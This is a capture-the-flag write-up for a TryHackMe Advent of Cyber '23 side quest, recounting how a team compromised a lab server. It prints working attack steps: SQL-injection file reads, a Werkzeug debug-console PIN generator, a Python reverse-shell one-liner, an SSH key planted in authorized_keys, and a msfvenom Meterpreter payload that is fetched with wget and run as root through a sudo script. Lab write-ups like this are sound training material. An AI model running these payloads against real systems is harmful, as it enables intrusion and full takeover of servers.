# The Bandit Surfer (THM Advent of Cyber '23 Side Quest 4 Difficulty: Hard)

This was a team effort with 4 other THM Discord members. 

## Finding the QR Code

To find the QR code that leads to this challenge you need to complete the task in Day 20 (DevSecOps Advent of Frostlings) of [THM Advent of Cyber '23](https://tryhackme.com/room/adventofcyber2023). 

Look around in the git repo files and you will find a calendar image that contains the qr code in it.

<p align="left">
  <img height=500 img src=./readme_assets/qr-code4.png/>
</p>

Scan the QR code and you are in! Welcome to [The Bandit Surfer](https://tryhackme.com/room/surfingyetiiscomingtotown)!

## The Bandit Surfer Introduction

<p align="left">
  <img height=100 img src=./readme_assets/challenge.PNG/>
</p>

<p align="left">
  <img height=300 img src=./readme_assets/hints.PNG/>
</p>

Ha! I've outdone meself, me hearty! After pokin' through every digital nook and cranny, crackin' a router wide open, and sneakin' into Frost-eau's laptop, I've unearthed every last secret, leadin' me straight to the heart of the icy storm. This is it, the moment I've been waitin' for since last year's icy fiasco – my shot at redemption in the frozen wilderness. But that sly detective Frost-eau is hot on my snowy trail. I gotta be quick as a hare and sly as a fox to stay ahead.

Now, over on the other side of the Pole, I hear Frost-eau's been yappin' with McSkidy – that crafty female CISO who nabbed me last time. They're cookin' up something new, something big, and it's already rollin' out. Frost-eau's all ears, tryin' to dig up more dirt, but the info's as scarce as sunlight in winter.

He's got a hunch, though, that I, the Bandit Yeti, is plannin' to stir up a blizzard with this merger mess. And he's right to worry – that server they're all fussin' over ain't been put through its paces yet. If someone, say a certain Yeti, were to sneak into that server, it wouldn't just be the Best Festival Company's secrets at their fingertips – AntarctiCrafts would be an open book, too!

But while Frost-eau's twiddlin' his thumbs waitin' for clues, I am already leapin' into action. I've sniffed out the server and begun weavin' my web, usin' it as my secret passage back into the Best Festival Company's lair. "Can you do it?" I hear you ask. Well of course, I can! I'm the Bandit Yeti, the legend of the digital tundra! Savvy? Now, heave ho! Let's show 'em what happens when they cross paths with the king of the cold!

<p align="left">
  <img height=300 img src=./readme_assets/yeti.PNG/>
</p>

You are given an IP address and 3 questions to answer.
```
*Question 1 - What is the user flag?*
*Question 2 - What is the root flag?*
*Question 3 - What is the yetikey4.txt flag?*
```
## Solution

The first thing I did was run nmap on the IP address. 
```
22/tcp open ssh OpenSSH 8.2p1** Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)  
8000/tcp open http-alt Server: Werkzeug/3.0.0 Python/3.8.10 
```

We only have 2 ports to check out and there's not enough info to get into SSH on 22. Let's check out port 8000 in a browser.

We find a website with 3 elf images you can download by clicking on them. I downloaded them all and used the typical stego tools to see if there was anything hidden inside. Nothing.

Using gobuster we find 2 directories to explore.

```
Gobuster dir -u http://rh:8000/ -w /usr/share/wordlists/gobuster/common.txt  
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================
Starting gobuster in directory enumeration mode  
===============================================================  
/console (Status: 200) [Size: 1563]  
/download (Status: 200) [Size: 20]  
Progress: 4614 / 4615 (99.98%)  
===============================================================
```


/console gives us a Console Locked login that needs a pin.

<p align="left">
  <img height=300 img src=./readme_assets/p-8000-console.PNG/>
</p>

/download gives us a `No file selected...` message

On the main webpage you can hover over an elf image to see the download url:

rh:8000/download?id=1
rh:8000/download?id=2
rh:8000/download?id=3

Trying other numbers we find image 4.

<p align="left">
  <img height=300 img src=./readme_assets/download.png/>
</p>

Any other number brings us to an error page that has some interesting information on it.

<p align="left">
  <img height=400 img src=./readme_assets/error-page.PNG/>
</p>

Researching Werkzeug/3.0.0 Python/3.8.10 we found a [Console PIN Exploit](https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting/) that looked promising. 

To use the exploit you need the following information:
```
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
```

The public bits can be found on the error page we found earlier:
mcskidy = username
flask.app = modname
Flask = getattr(app, '__name__', getattr(app.__class__, '__name__'))
/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py = getattr(mod, '__file__', None)

To find the private bits we will need to use Local File inclusion (LFI):
For Mac address use `http://rh:8000/download?id=' union select "file:///sys/class/net/eth0/address" where 1=1 and '1'='1`
The mac address must be converted to decimal before using.
The mac address will change each time you restart the THM room machine.

<p align="left">
  <img height=300 img src=./readme_assets/mac-address.PNG/>
</p>

For machine-id use `http://rh:8000/download?id=' union select "file:///etc/machine-id" where 1=1 and '1'='1`

This will download the information to your downloads folder. Cat the files and input into the exploit code.

Full exploit code for my machine:
```
import hashlib
from itertools import chain
probably_public_bits = [
    'mcskidy',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2818051077195',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'aee6189caee449718070b58132f2e4ba'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

Run the exploit code to receive your pin.

<p align="left">
  <img height=300 img src=./readme_assets/pin.PNG/>
</p>

Once you enter the correct pin you will have access to the interactive console.

<p align="left">
  <img height=300 img src=./readme_assets/interactive.PNG/>
</p>

The goal now is to get a reverse shell. We used [revshells.com](https://www.revshells.com/) to help generate the code needed for the console.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOURVMIP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

<p align="left">
  <img height=300 img src=./readme_assets/shell.PNG/>
</p>

Start the listener on your VM:
`nc -lvnp 4444`

Paste the shell code into the console and press enter.
Return to your listener and you should now have a reverse shell.

<p align="left">
  <img height=300 img src=./readme_assets/shell-connect.PNG/>
</p>

If your shell is fragile you can strengthen it using the following commands:
*On the remote server:*  
`python3 -c 'import pty;pty.spawn("/bin/bash")'` 
CTRL-Z  
*On your local system:* 
`echo $TERM` (my result = xterm-256color)  
`stty -a` (note rows and columns (45 x 175))  
`stty raw -echo`  
`fg`  
*Back on the remote server:*  
`reset`  
`xterm`  
`export TERM=xterm`  
`export SHELL=/bin/bash`  
`stty rows 45 columns 175` (again, use whatever you got from `stty -a`)  
`reset`

You should now have a proper shell with grep and nano capabilities.

Using `ls` in the mcskidy directory you will find user.txt and the first flag.

<p align="left">
  <img height=300 img src=./readme_assets/flag1.PNG/>
</p>

Looking at app.py in the app directory you see mcskidy's password.
```
MySQL configuration
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'mcskidy'
app.config['MYSQL_PASSWORD'] = '[REDACTED]'
app.config['MYSQL_DB'] = 'elfimages'
mysql = MySQL(app)
```

Looking further through the mcskidy directory we find /mcskidy/app/.git which gives us some very usefull info.

Use `git log` to to show all of the commits.

```
commit c23b1ae2d5c55dd73f26c2176c0d460e964f8b7b (HEAD -> master)
Author: mcskidy <mcskidy@proddb>
Date:   Thu Nov 2 15:41:22 2023 +0000

    Added new image and made website text more clearer

commit 71eabc70aaa548ac96f850aaf5663633417079db
Author: mcskidy <mcskidy@proddb>
Date:   Thu Oct 19 20:03:27 2023 +0000

    Fixed images MIME type and removed PDF

commit c1a0b22905cc0da0b5ad88c124125efa626013af
Author: mcskidy <mcskidy@proddb>
Date:   Thu Oct 19 20:02:57 2023 +0000

    Minor update

commit 9a261893fea6c32fe6c9934f902bc49f002e7e2a
Author: mcskidy <mcskidy@proddb>
Date:   Thu Oct 19 20:02:18 2023 +0000

    Final Changes

commit e9855c8a10cb97c287759f498c3314912b7f4713

Author: mcskidy <mcskidy@proddb>

Date:   Thu Oct 19 20:01:41 2023 +0000

   Changed MySQL user

commit f6b5c18f1d554de557bf17d89a8e617d4972901c
Author: mcskidy <mcskidy@proddb>
Date:   Thu Oct 19 20:01:10 2023 +0000

    Added MySQL utilization

commit 179fb01367b16dffb91bde040c0a6c5933a248b5
Author: mcskidy <mcskidy@proddb>
Date:   Thu Oct 19 20:00:41 2023 +0000

    Initial files
```

To read the commit details use `git show HASH_COMMIT`.

mcskidy changed his password:
```
commit c1a0b22905cc0da0b5ad88c124125efa626013af
Author: mcskidy <mcskidy@proddb>
Date:   Thu Oct 19 20:02:57 2023 +0000

    Minor update

diff --git a/app.py b/app.py
index 8d05622..5765c7d 100644
--- a/app.py
+++ b/app.py
@@ -10,7 +10,7 @@ app = Flask(__name__, static_url_path='/static')
 # MySQL configuration
 app.config['MYSQL_HOST'] = 'localhost'
 app.config['MYSQL_USER'] = 'mcskidy'
-app.config['MYSQL_PASSWORD'] = '[REDACTED]'
+app.config['MYSQL_PASSWORD'] = '[REDACTED]'
 app.config['MYSQL_DB'] = 'elfimages'
 mysql = MySQL(app)
 ```
 
We also found the mysql root password:
```
commit 81fd2d250483a542bc5c50f9433c9d5188115022

MySQL configuration
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = '[REDACTED]'
app.config['MYSQL_DB'] = 'elfimages'
mysql = MySQL(app)
```

A team member figure out how to log into ssh using this [resource](https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/).

*On your VM:*
`ssh-keygen`  
`cat ~/.ssh/id_rsa.pub`  
*On the THM box:* 
`echo "CONTENT OF PREVIOUS FILE" >> /home/mcskidy/.ssh/authorized_keys` 
On your VM: 
`ssh mcskidy@BOX_IP`

This opens up port 8000 for experimenting.

We spent days combing through every file and trying any privsec technique we came across with no success at getting root. 2 files we found seemed like the pathway but we were having trouble figuring out how to use them.

/opt/check.sh
/opt/.bashrc

```
User mcskidy may run the following commands on proddb:
    (root) /usr/bin/bash /opt/check.sh
```
	
There is something odd in the beginning of the .bashrc file.
```
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
enable -n [ # ]
# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac
```
And check.sh reads the .bashrc file.
```
#!/bin/bash
. /opt/.bashrc
cd /home/mcskidy/
```

The trick is how to use that without write permissions. 

If you type `enable` into the terminal it lists the available options, and `[` is one of them. Can that be used somehow? 

`[` is part of the shell that can be enabled and disabled. The rest `# ]` is not and is ignored by the `enable -n [ # ]` command. So, we just need to focus on the  `[`

We spent hours trying everything we could think of until a team member finally figured out how to root the box.

Create a reverse shell in Meterpreter 
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOURVPNIP LPORT=4445 -f elf -o payload2.elf`

Start a python web server from the directory where you have the payload2.elf file (or use fancy ssh/scp file transfer)
`python -m http.server`

Download the file from the  remote host
`wget http://YOURVPNIP:8000/payload2.elf`

Make the payload executable
`chmod +x payload2.elf`

Name the payload2.elf file `[`
`cp payload2.elf \[`

Launch the listener on your local system
`msfconsole -x "use /exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST YOURVPNIP;set LPORT 4445;exploit;"`

Run the check.sh script on the VM
`sudo /usr/bin/bash /opt/check.sh`

Now check your listener
```
*] Meterpreter session 2 opened (10.6.31.150:4445 -> 10.10.142.29:35550) at 2023-12-22 15:01:01 -0600

meterpreter > getuid
Server username: root
```

**We are root!**

Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2023-12-22 13:44:07 -0600  .bash_history
100644/rw-r--r--  3106  fil   2019-12-05 08:39:21 -0600  .bashrc
040700/rwx------  4096  dir   2023-05-01 20:13:34 -0500  .cache
020666/rw-rw-rw-  0     cha   2023-12-22 13:44:07 -0600  .mysql_history
100644/rw-r--r--  161   fil   2019-12-05 08:39:21 -0600  .profile
040700/rwx------  4096  dir   2023-12-13 11:27:12 -0600  .ssh
100600/rw-------  0     fil   2023-12-13 12:15:54 -0600  .viminfo
040755/rwxr-xr-x  4096  dir   2023-11-02 10:39:57 -0500  frosteau
100640/rw-r-----  38    fil   2023-10-19 01:40:20 -0500  root.txt
040700/rwx------  4096  dir   2023-03-27 18:25:12 -0500  snap
100640/rw-r-----  43    fil   2023-12-13 11:24:39 -0600  yetikey4.txt

Cat the `root.txt` and `yetikey4.txt` files for the final two flags.

<p align="left">
  <img height=300 img src=./readme_assets/flags.PNG/>
</p>

<p align="left">
  <img height=300 img src=./readme_assets/all-four.PNG/>
</p>

